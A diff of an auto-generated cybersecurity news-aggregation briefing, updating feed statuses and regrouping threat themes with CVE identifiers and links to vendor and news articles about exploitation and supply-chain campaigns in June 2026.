@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-06-09T16:09:19.410248+00:00
+- Generated: 2026-06-09T19:22:18.887150+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
-- Feeds OK: 78
-- Total items in window: 449
-- Total clusters raw: 180
-- Total clusters in packet: 68
-- Dropped low score: 112
+- Feeds OK: 77
+- Total items in window: 452
+- Total clusters raw: 178
+- Total clusters in packet: 69
+- Dropped low score: 109
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -74,92 +74,97 @@
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
-  - In window count: 3
+  - In window count: 2
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Google Threat Analysis Group** (threat_research_primary)
-  - URL: https://blog.google/threat-analysis-group/rss/
-  - Status: parse_error
-  - Item count: 0
   - In window count: 0
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
   - In window count: 1
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 3
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 5
+- **Google Threat Analysis Group** (threat_research_primary)
+  - URL: https://blog.google/threat-analysis-group/rss/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 3
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
   - Item count: 0
-  - In window count: 0
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
   - In window count: 0
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **SANS Internet Storm Center** (government_authoritative)
-  - URL: https://isc.sans.edu/rssfeed_full.xml
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 9
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
   - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 2
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **SANS Internet Storm Center** (government_authoritative)
+  - URL: https://isc.sans.edu/rssfeed_full.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
+  - In window count: 1
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 1
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
@@ -170,33 +175,23 @@
   - Status: ok
   - Item count: 78
   - In window count: 0
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Exploit-DB** (offensive_vulnerability_research)
-  - URL: https://www.exploit-db.com/rss.xml
-  - Status: ok
-  - Item count: 50
-  - In window count: 2
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 4
-- **The DFIR Report** (detection_response_operations)
-  - URL: https://thedfirreport.com/feed/
+- **Exploit-DB** (offensive_vulnerability_research)
+  - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 50
+  - In window count: 2
 - **watchTowr Labs** (offensive_vulnerability_research)
   - URL: https://labs.watchtowr.com/rss/
   - Status: ok
   - Item count: 15
   - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
+- **The DFIR Report** (detection_response_operations)
+  - URL: https://thedfirreport.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -205,6 +200,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
@@ -225,21 +225,31 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Rapid7** (offensive_vulnerability_research)
-  - URL: https://www.rapid7.com/blog/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 4
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
   - Item count: 30
   - In window count: 0
+- **Rapid7** (offensive_vulnerability_research)
+  - URL: https://www.rapid7.com/blog/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 5
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 6
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
@@ -249,17 +259,7 @@
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
   - Item count: 10
-  - In window count: 0
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 7
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
+  - In window count: 1
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
@@ -270,26 +270,36 @@
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 3
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 2
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 1
+  - Item count: 100
+  - In window count: 3
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 4
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
@@ -299,27 +309,27 @@
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
-  - In window count: 11
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 3
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
+  - In window count: 13
 - **Interconnects** (ai_security_agentic_risk)
   - URL: https://www.interconnects.ai/feed
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 4
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 12
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -330,13 +340,13 @@
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 13
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -345,21 +355,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
@@ -369,32 +364,32 @@
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 25
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
+  - In window count: 24
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
-  - Item count: 10
-  - In window count: 0
+  - Item count: 100
+  - In window count: 1
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
   - Status: ok
-  - Item count: 100
+  - Item count: 10
   - In window count: 0
 - **Troy Hunt** (practitioner_analysis)
   - URL: https://www.troyhunt.com/rss/
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 3
+  - Item count: 100
+  - In window count: 0
 - **The Hacker News** (cyber_news_breach_reporting)
   - URL: https://feeds.feedburner.com/TheHackersNews
   - Status: ok
@@ -405,6 +400,11 @@
   - Status: ok
   - Item count: 100
   - In window count: 32
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
@@ -414,7 +414,7 @@
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 14
+  - In window count: 15
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
@@ -440,16 +440,16 @@
   - Status: ok
   - Item count: 25
   - In window count: 25
-- **Reddit r/sysadmin** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/sysadmin/.rss
-  - Status: ok
-  - Item count: 25
-  - In window count: 24
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 25
   - In window count: 25
+- **Reddit r/sysadmin** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/sysadmin/.rss
+  - Status: ok
+  - Item count: 25
+  - In window count: 24
 - **Risky Business News** (practitioner_analysis)
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
@@ -459,7 +459,7 @@
   - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 21
+  - In window count: 20
 - **Just Security** (policy_strategy_geopolitics)
   - URL: https://www.justsecurity.org/feed/
   - Status: ok
@@ -473,103 +473,21 @@
 
 ## Affinity groups (themes)
 
-### Palo Alto Networks exploitation (2 CVEs)
-- Anchor signal: Palo Alto Networks
-- Theme key: palo-alto-networks
-- Cluster count: 11
-- Article count: 12
-- Cohesion: 0.24
-- Shared strong signals: Palo Alto Networks
-- Member CVEs: CVE-2024-21182, CVE-2026-39987
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation, zero_day, supply_chain, phishing_social_eng, mfa_bypass
-  - affected_products: Palo Alto Networks
-  - cve_ids: CVE-2026-0257, CVE-2024-21182
-  - urgency_signals: actively_exploited, zero_day, preauth_unauth
-- Cluster IDs: df6874157e, 791da8c978, 001d61d9b2, c41ed2f657, 5c65105996, a8a021acdc, 9aa815a49a, 4faddc63ad, dd945df79d, ad4a52246a, 271e39f9cb
-- Links:
-  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
-  - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
-  - https://www.reddit.com/r/sysadmin/comments/1u16gsm/top_enterprise_cves_from_last_week_worth_your/
-  - https://www.reddit.com/r/blueteamsec/comments/1u0v18q/threat_brief_active_exploitation_of_panos/
-  - https://thehackernews.com/2026/06/fluttershell-backdoor-spreads-to-macos.html
-  - https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
-  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
-  - https://www.reddit.com/r/cybersecurity/comments/1u17y7b/university_of_toronto_proofofconcept_ai_worm/
-  - https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
-  - https://thehackernews.com/2026/06/google-june-2026-android-update-patches.html
-  - https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
-  - https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html
-  - https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
-  - https://webflow.sysdig.com/blog/agentic-threat-actor-hits-the-orchestration-plane-ai-agent-driven-container-escape
-  - https://www.bleepingcomputer.com/news/security/check-point-links-vpn-zero-day-attacks-to-qilin-ransomware-gang/
-
-### CVE-2026-50751 exploitation activity
-- Anchor signal: CVE-2026-50751
-- Theme key: cve-2026-50751
-- Cluster count: 6
-- Article count: 8
-- Cohesion: 0.492
-- Shared strong signals: CVE-2026-50751
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion, zero_day, active_exploitation
-  - cve_ids: CVE-2026-50751, CVE-2026-50752
-  - urgency_signals: actively_exploited, zero_day, preauth_unauth
-- Cluster IDs: b11475fdb0, 9f943550b8, 52c396ff87, dd945df79d, 6415032017, 271e39f9cb
-- Links:
-  - https://www.rapid7.com/blog/post/etr-critical-check-point-vpn-zero-day-exploited-in-the-wild-cve-2026-50751
-  - https://www.reddit.com/r/blueteamsec/comments/1u0uap2/security_advisory_action_required_active/
-  - https://thehackernews.com/2026/06/critical-check-point-vpn-flaw-exploited.html
-  - https://www.infosecurity-magazine.com/news/check-point-critical-auth-bypass/
-  - https://www.securityweek.com/check-point-vpn-zero-day-exploited-in-qilin-ransomware-attacks/
-  - https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
-  - https://www.darkreading.com/vulnerabilities-threats/check-point-vpn-flaw-exploited-early-may
-  - https://www.bleepingcomputer.com/news/security/check-point-links-vpn-zero-day-attacks-to-qilin-ransomware-gang/
-
-### SolarWinds active exploitation
-- Anchor signal: SolarWinds
-- Theme key: solarwinds
-- Cluster count: 5
-- Article count: 9
-- Cohesion: 0.209
-- Shared strong signals: SolarWinds
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation, ransomware_extortion, supply_chain, zero_day, data_breach
-  - affected_industries: government
-  - affected_products: SolarWinds, Palo Alto Networks, Microsoft Windows
-  - cve_ids: CVE-2026-0257, CVE-2026-41089, CVE-2026-50751, CVE-2026-28318
-  - urgency_signals: actively_exploited, preauth_unauth, zero_day
-- Cluster IDs: df6874157e, 52c396ff87, 5c65105996, d86e039c0c, dd945df79d
-- Links:
-  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
-  - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
-  - https://www.reddit.com/r/sysadmin/comments/1u16gsm/top_enterprise_cves_from_last_week_worth_your/
-  - https://www.reddit.com/r/blueteamsec/comments/1u0v18q/threat_brief_active_exploitation_of_panos/
-  - https://thehackernews.com/2026/06/fluttershell-backdoor-spreads-to-macos.html
-  - https://www.securityweek.com/check-point-vpn-zero-day-exploited-in-qilin-ransomware-attacks/
-  - https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
-  - https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
-  - https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
-
-### Microsoft Windows vulnerability activity
+### Microsoft Windows active exploitation
 - Anchor signal: Microsoft Windows
 - Theme key: microsoft-windows
-- Cluster count: 4
-- Article count: 16
+- Cluster count: 5
+- Article count: 20
 - Cohesion: 0.2
 - Shared strong signals: Microsoft Windows
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
+  - threat_categories: active_exploitation
   - affected_products: Microsoft Windows, SolarWinds
   - cve_ids: CVE-2026-41089
-  - urgency_signals: preauth_unauth, no_patch_yet
-- Cluster IDs: df6874157e, 6007b3dd3f, 5e7c345e11, d86e039c0c
+  - urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
+- Cluster IDs: df6874157e, 6007b3dd3f, 5e7c345e11, d86e039c0c, 84e90fe8a7
 - Links:
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
   - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
@@ -581,27 +499,92 @@
   - https://www.helpnetsecurity.com/2026/06/09/anthropic-mythos-preview-n-day-exploits-firefox-windows/
   - https://www.microsoft.com/en-us/security/blog/2026/06/05/securing-ci-cd-in-agentic-world-claude-code-github-action-case/
   - https://www.schneier.com/blog/archives/2026/06/critical-zcash-vulnerability-found-and-fixed.html
+  - https://www.bleepingcomputer.com/news/security/xbow-tests-anthropics-mythos-preview-for-offensive-security/
   - https://www.securityweek.com/claude-mythos-turns-n-days-into-n-hours-with-rapid-exploit-creation/
   - https://thehackernews.com/2026/06/claude-code-github-action-flaw-let-one.html
   - https://www.infosecurity-magazine.com/news/anthropic-glasswing-expansion/
   - https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
+  - https://www.bleepingcomputer.com/news/microsoft/microsoft-june-2026-patch-tuesday-fixes-3-zero-day-200-flaws/
+
+### SolarWinds exploitation (CVE-2026-50751)
+- Anchor signal: SolarWinds
+- Theme key: solarwinds
+- Cluster count: 7
+- Article count: 9
+- Cohesion: 0.209
+- Shared strong signals: SolarWinds
+- Member CVEs: CVE-2026-50751
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation, ransomware_extortion, supply_chain, zero_day, data_breach
+  - affected_industries: government
+  - affected_products: SolarWinds, Microsoft Windows, Palo Alto Networks
+  - cve_ids: CVE-2026-41089, CVE-2026-50751, CVE-2026-20230, CVE-2026-28318
+  - urgency_signals: actively_exploited, preauth_unauth, zero_day, no_patch_yet
+- Cluster IDs: b11475fdb0, df6874157e, 9f943550b8, 52c396ff87, 5c65105996, d86e039c0c, dd945df79d
+- Links:
+  - https://www.rapid7.com/blog/post/etr-critical-check-point-vpn-zero-day-exploited-in-the-wild-cve-2026-50751
+  - https://www.reddit.com/r/blueteamsec/comments/1u0uap2/security_advisory_action_required_active/
+  - https://thehackernews.com/2026/06/critical-check-point-vpn-flaw-exploited.html
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
+  - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
+  - https://www.reddit.com/r/sysadmin/comments/1u16gsm/top_enterprise_cves_from_last_week_worth_your/
+  - https://www.reddit.com/r/blueteamsec/comments/1u0v18q/threat_brief_active_exploitation_of_panos/
+  - https://thehackernews.com/2026/06/fluttershell-backdoor-spreads-to-macos.html
+  - https://www.infosecurity-magazine.com/news/check-point-critical-auth-bypass/
+  - https://www.securityweek.com/check-point-vpn-zero-day-exploited-in-qilin-ransomware-attacks/
+  - https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
+  - https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
+  - https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
+
+### Microsoft 365 exploitation (3 CVEs)
+- Anchor signal: Microsoft 365
+- Theme key: microsoft-365
+- Cluster count: 11
+- Article count: 9
+- Cohesion: 0.289
+- Shared strong signals: Microsoft 365
+- Member CVEs: CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain, zero_day, active_exploitation
+  - affected_products: Microsoft 365, GitHub, Android
+  - cve_ids: CVE-2026-11645, CVE-2026-20230, CVE-2026-23479
+  - urgency_signals: actively_exploited, zero_day, no_patch_yet
+- Cluster IDs: c2bce4cf64, 791da8c978, a986419b22, 5c65105996, 9aa815a49a, 4faddc63ad, 1714548889, d86e039c0c, 60f95f513c, 5da6b03ed1, 15d2915b57
+- Links:
+  - https://www.helpnetsecurity.com/2026/06/09/google-chrome-zero-day-cve-2026-11645/
+  - https://thehackernews.com/2026/06/chrome-v8-zero-day-cve-2026-11645.html
+  - https://www.infosecurity-magazine.com/news/google-patch-chrome-vulnerability/
+  - https://www.reddit.com/r/AskNetsec/comments/1tyq27j/confirmed_void_dokkaebi_infection_on_macos_how_do/
+  - https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
+  - https://www.bleepingcomputer.com/news/security/google-patches-fifth-chrome-zero-day-bug-exploited-in-attacks-this-year/
+  - https://thehackernews.com/2026/06/cisa-adds-actively-exploited-solarwinds.html
+  - https://thehackernews.com/2026/06/unpatched-windows-search-uri.html
+  - https://thehackernews.com/2026/06/cisco-patches-cve-2026-20230-in-unified.html
+  - https://aws.amazon.com/blogs/security/icymi-may-2026-aws-security/
+  - https://www.darkreading.com/cyber-risk/fbi-flagged-phishing-kit-kali365-expands-its-reach
+  - https://thehackernews.com/2026/06/pcpjack-hijacks-230-aws-google-cloud.html
+  - https://research.checkpoint.com/2026/8th-june-threat-intelligence-report/
+  - https://thehackernews.com/2026/06/autonomous-ai-tool-finds-2-year-old-rce.html
+  - https://thehackernews.com/2026/06/veeam-backup-replication-rce-flaw-lets.html
+  - https://www.volexity.com/blog/2026/06/04/verdantbamboo-just-another-brickstorm-in-the-firewall/
 
 ### supply chain targeting PyPI
 - Anchor signal: PyPI
 - Theme key: pypi
 - Cluster count: 4
-- Article count: 14
-- Cohesion: 0.267
+- Article count: 12
+- Cohesion: 0.354
 - Shared strong signals: PyPI
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: supply_chain
-  - affected_products: PyPI, GitHub, npm
-- Cluster IDs: 4dd67b47a9, 25c84fc509, a316915c33, a8d16f40d7
+  - threat_categories: supply_chain, credential_theft
+  - affected_products: PyPI, Kubernetes, GitHub, npm
+- Cluster IDs: 4dd67b47a9, ac7c9abdf6, a316915c33, a8d16f40d7
 - Links:
   - https://orca.security/resources/blog/jupyter-enterprise-gateway-vulnerabilities/
-  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
   - https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/
   - https://www.securityweek.com/over-100-npm-pypi-packages-hit-in-new-shai-hulud-supply-chain-attacks/
   - https://risky.biz/RBNEWS572/
@@ -610,30 +593,53 @@
   - https://thehackernews.com/2026/06/hades-pypi-attack-19-packages-poisoned.html
   - https://www.bleepingcomputer.com/news/security/new-shai-hulud-attack-trojanizes-19-science-focused-pypi-packages/
   - https://www.darkreading.com/application-security/hades-campaign-pypi-shai-hulud
-  - https://www.reddit.com/r/cybersecurity/comments/1u0zzck/hades_pypi_attack_19_packages_poisoned_to_autorun/
+  - https://www.reddit.com/r/cybersecurity/comments/1u0lrss/new_shaihulud_attack_trojanizes_19_sciencefocused/
   - https://www.ncsc.gov.uk/blogs/software-supply-chain-attacks-check-your-dependencies
 
-### supply chain targeting npm
-- Anchor signal: npm
-- Theme key: npm
+### Palo Alto Networks active exploitation
+- Anchor signal: Palo Alto Networks
+- Theme key: palo-alto-networks
 - Cluster count: 3
 - Article count: 7
-- Cohesion: 0.252
-- Shared strong signals: npm
+- Cohesion: 0.215
+- Shared strong signals: Palo Alto Networks
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: supply_chain
-  - affected_products: npm, PyPI
-- Cluster IDs: 25c84fc509, 791da8c978, a8d16f40d7
+  - threat_categories: active_exploitation
+  - affected_products: Palo Alto Networks, SolarWinds
+  - cve_ids: CVE-2026-0257, CVE-2026-44825
+  - urgency_signals: preauth_unauth, actively_exploited
+- Cluster IDs: df6874157e, 001d61d9b2, dd945df79d
 - Links:
-  - https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/
-  - https://www.microsoft.com/en-us/security/blog/2026/06/02/preinstall-persistence-inside-red-hat-npm-miasma-credential-stealing-campaign/
-  - https://www.securityweek.com/over-100-npm-pypi-packages-hit-in-new-shai-hulud-supply-chain-attacks/
-  - https://risky.biz/RBNEWS572/
-  - https://thehackernews.com/2026/06/ironworm-and-new-miasma-worm-variant.html
-  - https://thehackernews.com/2026/06/cisa-adds-exploited-magento-rce-flaw.html
-  - https://www.ncsc.gov.uk/blogs/software-supply-chain-attacks-check-your-dependencies
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-0257/
+  - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
+  - https://www.reddit.com/r/sysadmin/comments/1u16gsm/top_enterprise_cves_from_last_week_worth_your/
+  - https://www.reddit.com/r/blueteamsec/comments/1u0v18q/threat_brief_active_exploitation_of_panos/
+  - https://thehackernews.com/2026/06/fluttershell-backdoor-spreads-to-macos.html
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-44825/
+  - https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-check-point-flaw-exploited-by-ransomware-gangs/
+
+### Android active exploitation
+- Anchor signal: Android
+- Theme key: android
+- Cluster count: 4
+- Article count: 4
+- Cohesion: 0.37
+- Shared strong signals: Android
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain, zero_day, active_exploitation, ransomware_extortion
+  - affected_products: Android, GitHub, Microsoft 365
